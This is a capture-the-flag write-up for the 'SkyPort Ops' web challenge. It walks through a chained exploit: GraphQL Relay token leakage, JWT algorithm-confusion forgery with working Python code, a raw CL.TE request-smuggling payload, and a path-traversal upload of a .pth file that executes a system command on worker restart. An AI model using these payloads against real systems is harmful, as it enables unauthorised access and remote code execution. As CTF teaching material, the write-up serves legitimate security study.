# SkyPort Ops - Writeup

## Challenge Info

- **Category:** Web
- **CTF:** 0xfun 2026
- **Description:** SkyPort Ops is an airport operations portal accessible only by Security Officers. Strange activities have been observed inside the internal system.

## Flag

```
0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

## Analysis

The challenge provides source code for a FastAPI application with several vulnerabilities that must be chained together:

1. **GraphQL API** (`/graphql`) using Strawberry with Relay support — exposes `passengers`, `staff`, `flights` queries and a `node` query
2. **JWT Authentication** using `python-jose` with RSA keys generated at startup
3. **File Upload** at `/internal/upload` requiring admin JWT, with a path traversal vulnerability
4. **SecurityGateway** (`lib-gateway-port`) blocking access to `/internal/*` endpoints
5. **SUID binary** `/flag` that reads `/root/flag.txt`

## Exploit Chain

### Step 1: Leak Staff JWT via GraphQL Relay

The `StaffNode` type exposes an `access_token` field. Using Strawberry's Relay `node` query with a global ID (`base64("StaffNode:2")` = `U3RhZmZOb2RlOjI=`), we can retrieve `officer_chen`'s JWT:

```graphql
{
  node(id: "U3RhZmZOb2RlOjI=") {
    ... on StaffNode {
      username
      accessToken
    }
  }
}
```

### Step 2: Extract RSA Public Key

The JWT payload contains `jwks_uri: /api/<random_hex>`. Fetching this endpoint returns the RSA public key in PEM format:

```
GET /api/ee32271fb4a3df9b
```

### Step 3: JWT Algorithm Confusion (HS256)

The `_decode_admin_jwt` function has a critical vulnerability:

```python
payload = jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)
```

With `algorithms=None`, `python-jose` accepts whatever algorithm is specified in the JWT header. This enables an **algorithm confusion attack**: we sign a new JWT with `alg: HS256` using the RSA public key (DER bytes) as the HMAC secret. The server will verify it successfully because it uses the same DER bytes as the key.

```python
from jose import jwt as jose_jwt
from cryptography.hazmat.primitives import serialization

pub_key = serialization.load_pem_public_key(public_key_pem)
der_bytes = pub_key.public_bytes(
    serialization.Encoding.DER,
    serialization.PublicFormat.SubjectPublicKeyInfo,
)
admin_token = jose_jwt.encode(
    {"sub": "admin", "role": "admin"},
    der_bytes,
    algorithm="HS256"
)
```

### Step 4: CL.TE HTTP Request Smuggling

The `lib-gateway-port` SecurityGateway blocks all requests to `/internal/*`. To bypass it, we exploit a **CL.TE (Content-Length vs Transfer-Encoding) request smuggling** vulnerability:

- The **gateway** prioritizes `Content-Length` and forwards the entire body (including the smuggled request) as part of a single legitimate request
- The **backend (hypercorn)** prioritizes `Transfer-Encoding: chunked`, reads until `0\r\n\r\n`, and treats the remaining data as a **new request**

```
POST / HTTP/1.1                          <-- Gateway sees: legitimate request to /
Host: chall.0xfun.org:60296
Content-Length: <total_body_length>       <-- Gateway reads this many bytes
Transfer-Encoding: chunked               <-- Backend uses this instead

0\r\n\r\n                                <-- Backend: end of chunked body
POST /internal/upload HTTP/1.1           <-- Backend: new request (bypasses gateway!)
Host: chall.0xfun.org:60296
Authorization: Bearer <admin_token>
Content-Type: multipart/form-data; boundary=bound123
Content-Length: <multipart_length>

--bound123
Content-Disposition: form-data; name="file"; filename="/home/skyport/.local/lib/python3.11/site-packages/evil.pth"

import os; os.system('/flag > /tmp/skyport_uploads/flag.txt')
--bound123--
```

After sending this, a follow-up `GET /` on the same connection triggers the backend to process the smuggled upload request.

### Step 5: Path Traversal + .pth Injection

The `save_uploaded_file` function has a path traversal vulnerability:

```python
if filename.startswith("/"):
    destination = Path(filename)  # Absolute path used directly!
```

We upload a `.pth` file to the `skyport` user's local site-packages:
```
/home/skyport/.local/lib/python3.11/site-packages/evil.pth
```

Python automatically processes `.pth` files from site-packages directories on startup. Lines starting with `import` are executed as code:
```
import os; os.system('/flag > /tmp/skyport_uploads/flag.txt')
```

### Step 6: Trigger Worker Restart

The hypercorn server runs with `--max-requests 100`, meaning each worker restarts after handling 100 requests. By sending 200+ requests, we force both workers to restart. On restart, Python processes the `.pth` file, which executes the SUID `/flag` binary and writes the flag to the static files directory.

```
GET /uploads/flag.txt -> 0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

## Vulnerability Summary

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | GraphQL IDOR via Relay Node | Leak staff JWT token |
| 2 | JWT Algorithm Confusion (`algorithms=None`) | Forge admin JWT |
| 3 | CL.TE HTTP Request Smuggling | Bypass gateway WAF |
| 4 | Path Traversal in file upload | Write to arbitrary paths |
| 5 | Python .pth code execution | RCE on worker restart |
